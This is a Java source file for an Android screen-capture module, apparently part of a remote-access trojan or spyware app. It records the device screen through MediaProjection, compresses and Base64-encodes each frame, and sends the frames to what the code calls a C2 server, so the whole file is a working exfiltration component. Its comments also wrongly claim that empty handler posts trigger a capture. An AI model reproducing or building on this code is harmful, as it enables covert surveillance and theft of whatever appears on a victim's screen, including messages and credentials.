package com.tarjon.admin.utils;

import android.annotation.SuppressLint;
import android.app.Activity;
import android.content.Context;
import android.content.Intent;
import android.graphics.Bitmap;
import android.graphics.PixelFormat;
import android.hardware.display.DisplayManager;
import android.hardware.display.VirtualDisplay;
import android.media.Image;
import android.media.ImageReader;
import android.media.projection.MediaProjection;
import android.media.projection.MediaProjectionManager;
import android.os.Handler;
import android.os.Looper;
import android.util.Base64;
import android.util.DisplayMetrics;
import android.util.Log;
import android.view.WindowManager;

import com.tarjon.admin.network.C2Connection;

import java.io.ByteArrayOutputStream;
import java.nio.ByteBuffer;
import java.util.concurrent.Executors;
import java.util.concurrent.ScheduledExecutorService;
import java.util.concurrent.TimeUnit;

/**
 * Manages screen capture functionality using MediaProjection API
 * Can capture single screenshots or continuous screen recordings
 */
public class ScreenCaptureManager {
    private static final String TAG = "ScreenCaptureManager";
    
    private final Context context;
    private MediaProjection mediaProjection;
    private ImageReader imageReader;
    private VirtualDisplay virtualDisplay;
    private int screenWidth;
    private int screenHeight;
    private int screenDensity;
    private ScheduledExecutorService executor;
    private boolean isCapturing = false;
    private C2Connection c2Connection;
    
    // Quality settings
    private static final int DEFAULT_QUALITY = 50; // 0-100
    private static final int DEFAULT_SCALE = 50; // % of original size
    private int quality = DEFAULT_QUALITY;
    private int scale = DEFAULT_SCALE;
    
    // Callback for image processing
    private final ImageReader.OnImageAvailableListener imageAvailableListener = 
            new ImageReader.OnImageAvailableListener() {
        @Override
        public void onImageAvailable(ImageReader reader) {
            Image image = null;
            Bitmap bitmap = null;
            
            try {
                image = reader.acquireLatestImage();
                if (image == null) {
                    return;
                }
                
                Image.Plane[] planes = image.getPlanes();
                ByteBuffer buffer = planes[0].getBuffer();
                int pixelStride = planes[0].getPixelStride();
                int rowStride = planes[0].getRowStride();
                int rowPadding = rowStride - pixelStride * screenWidth;
                
                // Create bitmap
                bitmap = Bitmap.createBitmap(
                        screenWidth + rowPadding / pixelStride,
                        screenHeight,
                        Bitmap.Config.ARGB_8888
                );
                bitmap.copyPixelsFromBuffer(buffer);
                
                // Scale down if needed
                if (scale != 100) {
                    int newWidth = screenWidth * scale / 100;
                    int newHeight = screenHeight * scale / 100;
                    bitmap = Bitmap.createScaledBitmap(bitmap, newWidth, newHeight, true);
                }
                
                // Convert to JPEG and compress
                ByteArrayOutputStream stream = new ByteArrayOutputStream();
                bitmap.compress(Bitmap.CompressFormat.JPEG, quality, stream);
                byte[] byteArray = stream.toByteArray();
                
                // Convert to Base64
                final String base64Image = Base64.encodeToString(byteArray, Base64.DEFAULT);
                
                // Send to C2 server
                if (c2Connection != null) {
                    c2Connection.sendScreenshot(base64Image);
                }
                
            } catch (Exception e) {
                Log.e(TAG, "Error capturing screen: " + e.getMessage());
            } finally {
                if (bitmap != null) {
                    bitmap.recycle();
                }
                
                if (image != null) {
                    image.close();
                }
            }
        }
    };
    
    public ScreenCaptureManager(Context context, C2Connection c2Connection) {
        this.context = context;
        this.c2Connection = c2Connection;
        
        // Get screen metrics
        WindowManager windowManager = (WindowManager) context.getSystemService(Context.WINDOW_SERVICE);
        DisplayMetrics metrics = new DisplayMetrics();
        windowManager.getDefaultDisplay().getMetrics(metrics);
        this.screenWidth = metrics.widthPixels;
        this.screenHeight = metrics.heightPixels;
        this.screenDensity = metrics.densityDpi;
    }
    
    /**
     * Initialize media projection with the result from permission request
     * @param resultCode Result code from onActivityResult
     * @param data Intent data from onActivityResult
     */
    public void initializeMediaProjection(int resultCode, Intent data) {
        MediaProjectionManager projectionManager = 
                (MediaProjectionManager) context.getSystemService(Context.MEDIA_PROJECTION_SERVICE);
        mediaProjection = projectionManager.getMediaProjection(resultCode, data);
        setupVirtualDisplay();
    }
    
    /**
     * Set up the virtual display for screen capture
     */
    @SuppressLint("WrongConstant")
    private void setupVirtualDisplay() {
        imageReader = ImageReader.newInstance(
                screenWidth, screenHeight, PixelFormat.RGBA_8888, 2);
        
        virtualDisplay = mediaProjection.createVirtualDisplay(
                "ScreenCapture",
                screenWidth, screenHeight, screenDensity,
                DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR,
                imageReader.getSurface(), null, null);
        
        imageReader.setOnImageAvailableListener(imageAvailableListener, new Handler(Looper.getMainLooper()));
    }
    
    /**
     * Start continuous screen capture at specified interval
     * @param intervalMs Interval between captures in milliseconds
     */
    public void startCapture(final long intervalMs) {
        if (isCapturing) {
            stopCapture();
        }
        
        isCapturing = true;
        executor = Executors.newSingleThreadScheduledExecutor();
        executor.scheduleAtFixedRate(new Runnable() {
            @Override
            public void run() {
                // The image available listener will handle the capture
                if (imageReader != null) {
                    // Trigger capture
                    Handler handler = new Handler(Looper.getMainLooper());
                    handler.post(new Runnable() {
                        @Override
                        public void run() {
                            // This empty post will trigger the imageAvailableListener
                        }
                    });
                }
            }
        }, 0, intervalMs, TimeUnit.MILLISECONDS);
    }
    
    /**
     * Stop continuous screen capture
     */
    public void stopCapture() {
        isCapturing = false;
        if (executor != null) {
            executor.shutdownNow();
            executor = null;
        }
    }
    
    /**
     * Take a single screenshot
     */
    public void captureScreenshot() {
        if (imageReader != null) {
            // Trigger capture
            Handler handler = new Handler(Looper.getMainLooper());
            handler.post(new Runnable() {
                @Override
                public void run() {
                    // This empty post will trigger the imageAvailableListener
                }
            });
        }
    }
    
    /**
     * Set quality and scale parameters for screenshots
     * @param quality JPEG quality (0-100)
     * @param scale Screenshot size as percentage of original (1-100)
     */
    public void setQualitySettings(int quality, int scale) {
        this.quality = Math.min(100, Math.max(1, quality));
        this.scale = Math.min(100, Math.max(1, scale));
    }
    
    /**
     * Release all resources
     */
    public void release() {
        stopCapture();
        
        if (virtualDisplay != null) {
            virtualDisplay.release();
            virtualDisplay = null;
        }
        
        if (imageReader != null) {
            imageReader.setOnImageAvailableListener(null, null);
            imageReader.close();
            imageReader = null;
        }
        
        if (mediaProjection != null) {
            mediaProjection.stop();
            mediaProjection = null;
        }
    }
}